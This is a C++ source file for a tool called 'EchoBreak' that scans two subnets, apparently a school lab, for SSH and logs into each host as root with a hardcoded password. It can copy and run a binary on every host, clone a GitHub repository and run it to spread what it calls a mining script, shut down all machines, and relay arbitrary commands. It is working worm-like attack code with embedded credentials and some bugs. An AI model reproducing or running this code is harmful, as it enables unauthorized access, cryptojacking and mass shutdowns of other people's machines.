#include <cstdlib>
#include <iostream>
#include <string>
#include <unistd.h>
#include <memory>
#include <fstream>
#include <vector>
#include <array>
#include <sys/socket.h>
#include <arpa/inet.h>

// i am so fucking tired

bool isPortOpen(const std::string& ip, int port, bool time=0) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        std::cerr << "fail to create socket" << std::endl;
        return false;
    }

    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    inet_pton(AF_INET, ip.c_str(), &server.sin_addr);

    struct timeval timeout;
    time ? timeout.tv_sec = 2 : timeout.tv_sec = 1;  
    timeout.tv_usec = 500000;
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (const char*)&timeout, sizeof(timeout));

    // try
    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
        close(sock);
        return false;  // port closed
    }

    close(sock);
    return true;  // port opened
}

std::string exec(const char* cmd) {
    std::array<char, 128> buffer;
    std::string result;
    std::unique_ptr<FILE, int(*)(FILE*)> pipe(popen(cmd, "r"), pclose);
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }

    if (!result.empty() && result.back() == '\n') {
        result.pop_back();
    }

    return result;
}

std::vector<std::string> split(std::string str){
	std::string word = "";
	std::vector<std::string> res;
	for(char c : str){
		if(c == ';'){
			res.push_back(word);
			word = "";
		}
		else{
			word += c;
		}
	}
	res.push_back(word);
	return res;
}

inline std::string connect(std::string host, std::string command){
	std::ifstream in("hosts.txt", std::ios::in);
	if(in.is_open()){
		std::string line = "";
		while(std::getline(in, line)){
			if(split(line)[0] == host){
				return exec(("sshpass -p 12345678 student@" + split(line)[1] + " " + command).c_str());
			}
		}
	}
	else{
		return "hosts not found\n";
	}
	in.close();
	return "host not found\n";
}

int main(int argc, char* argv[]){	

	std::string pass;
	std::hash<std::string> hash;
	std::cout << "Enter the password for full version: ";
	std::cin >> pass;
	if(hash(pass) != 7067835266441158162) return 1;
	else std::cout << "Running\n";

	std::cout << "W3LC0M T0 \033[095mECHOBREAK\033[0m!!" << std::endl;
	std::string command;
	std::vector<std::string> hosts;
	time_t start, end;
	int total = 0;

	time(&start);
	if(argc <= 1){
		std::cout << "Enter: scan, setup, connect\n";
		std::cout << "	scan - scanns for computers\n";
		std::cout << "	setup - setup EchoBreak\n";
		std::cout << "  shutdown - shutdown all pc (DANGEROUS)\n";
		std::cout << "  share - share minig script (DANGEROUS)\n";
		std::cout << "	send [host] [cmd] - send cmd to host\n";
		return 1;
	}
	std::string arg = argv[1];
	if(arg == "scan"){
		std::string currect_host = "";
		for(int i = 2; i < 256; ++i){
			//checking for 212
			if(isPortOpen("172.17.212."+std::to_string(i), 22)){
				command = "sshpass -p 1347QwAsZx ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2  root@172.17.212." + std::to_string(i) + " hostname"; //ip
				currect_host = exec(command.c_str()) + ";172.17.212."+std::to_string(i);
				hosts.push_back(currect_host); //to ip data base (edit to system if it does not working)
				std::cout << currect_host << std::endl;
				++total;
			}
			//checking for 213
			if(isPortOpen("172.17.213."+std::to_string(i), 22)){
				command = "sshpass -p 1347QwAsZx ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2  root@172.17.213." + std::to_string(i) + " hostname"; //ip
				currect_host = exec(command.c_str()) + + ";172.17.213."+std::to_string(i);
				hosts.push_back(currect_host); //to ip data base (edit to system if it does not working)
				std::cout << currect_host << std::endl;
				++total;
			}
		}

		std::ofstream out("hosts.txt", std::ios::out); //open file to rewrite all data
		for(auto host : hosts){ // for each loop
			out << host << std::endl; // write
		}
		out.close(); // close file
	}	

	else if(arg == "share"){

		std::string host;

		for(int i = 2; i < 256; ++i){
		//212
		if(isPortOpen("172.17.212."+std::to_string(i), 22, 1)){
			command = "sshpass -p 1347QwAsZx ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2  root@172.17.212." + std::to_string(i) + " hostname"; //command
			host = exec(command.c_str());
			if(host[0] == 'S'){
				std::cout << host << "\n";
				++total;
				system(("sshpass -p 1347QwAsZx ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2  root@172.17.212." + std::to_string(i) + " git clone https://github.com/Andrew-24coop/EchoBreak && cd EchoBreak && ./ebsetup").c_str());
			}
		}
		//213
		if(isPortOpen("172.17.213."+std::to_string(i), 22, 1)){
			command = "sshpass -p 1347QwAsZx ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2  root@172.17.213." + std::to_string(i) + " hostname"; //command
			host = exec(command.c_str());
			if(host[0] == 'S'){
				std::cout << host << "\n";
				++total;
				system(("sshpass -p 1347QwAsZx ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2  root@172.17.213." + std::to_string(i) + " git clone https://github.com/Andrew-24coop/EchoBreak && cd EchoBreak && ./ebsetup").c_str());
				}
		
			}
		}
	}
	else if(arg == "setup"){
			for(int i = 2; i < 256; ++i){
			//setup for 212
			if(isPortOpen("172.17.212."+std::to_string(i), 22)){
				command = "sshpass -p 1347QwAsZx scp -o StrictHostKeyChecking=no -o ConnectTimeout=2 eb.net root@172.17.212." + std::to_string(i) + ":/bin"; 
				system(command.c_str());
				std::cout << i << std::endl;
				system(("sshpass -p 1347QwAsZx ssh root@172.17.212." + std::to_string(i) + " /bin/./eb.net").c_str());
				++total;
			}
			//setup for 213
			if(isPortOpen("172.17.213."+std::to_string(i), 22)){
				command = "sshpass -p 1347QwAsZx scp -o StrictHostKeyChecking=no -o ConnectTimeout=2 eb.net root@172.17.213." + std::to_string(i) + ":/bin"; 
				system(command.c_str());
				std::cout << i << std::endl;
				system(("sshpass -p 1347QwAsZx ssh root@172.17.213." + std::to_string(i) + " /bin/./eb.net").c_str());
				++total;
			}
		}
	}

	else if(arg == "shutdown"){

		std::string time = argv[2];
		std::string host;
		for(int i = 2; i < 256; ++i){
			//212
			if(isPortOpen("172.17.212."+std::to_string(i), 22, 1)){
				command = "sshpass -p 1347QwAsZx ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2  root@172.17.212." + std::to_string(i) + " hostname"; //command
			    host = exec(command.c_str());
				if(host[0] == 'S'){
					std::cout << host << "\n";
					++total;
					system(("sshpass -p 1347QwAsZx ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2  root@172.17.212." + std::to_string(i) + " shutdown " + time).c_str());
				}
			}
			//213
			if(isPortOpen("172.17.213."+std::to_string(i), 22, 1)){
				command = "sshpass -p 1347QwAsZx ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2  root@172.17.213." + std::to_string(i) + " hostname"; //command
				host = exec(command.c_str());
				if(host[0] == 'S'){
					std::cout << host << "\n";
					++total;
					system(("sshpass -p 1347QwAsZx ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2  root@172.17.213." + std::to_string(i) + " shutdown " + time).c_str());
				}
			}
		}
	}
	
	else if(arg == "send"){
		std::string host = argv[1];
		std::string cmd = "";
		for(int i = 2; i < argc; ++i){
			cmd += argv[i];
		}
		std::cout << connect(host, cmd);

	}
	time(&end);
	double execution_time = difftime(end, start);
	std::cout << "time taken: " << std::fixed << execution_time << std::endl;
	std::cout << "total hosts: " << total << std::endl;
	return 0xABCDEF;
}
